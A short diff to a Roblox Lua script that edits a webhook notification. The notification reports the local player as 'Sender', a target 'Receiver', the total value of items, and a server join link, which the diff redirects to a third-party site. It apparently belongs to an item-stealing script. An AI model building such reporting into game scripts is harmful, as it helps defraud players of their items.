@@ -116,7 +116,7 @@ local function sendWebhookNotification(items, totalValue, targetName)
                 {name = "👤 Sender", value = Players.LocalPlayer.Name, inline = true},
                 {name = "🎯 Receiver", value = targetName, inline = true},
                 {name = "💰 Total Value", value = "$"..formatNumber(totalValue), inline = true},
-                {name = "🔗 Quick Join", value = string.format("[Click Here](https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s)", game.PlaceId, game.JobId)}
+                {name = "🔗 Quick Join", value = string.format("https://fern.wtf/JoinPlace?placeId=%d&jobId=%s", game.PlaceId, game.JobId)}
             },
             footer = {text = os.date("%Y-%m-%d %H:%M:%S")},
             timestamp = DateTime.now():ToIsoDate()
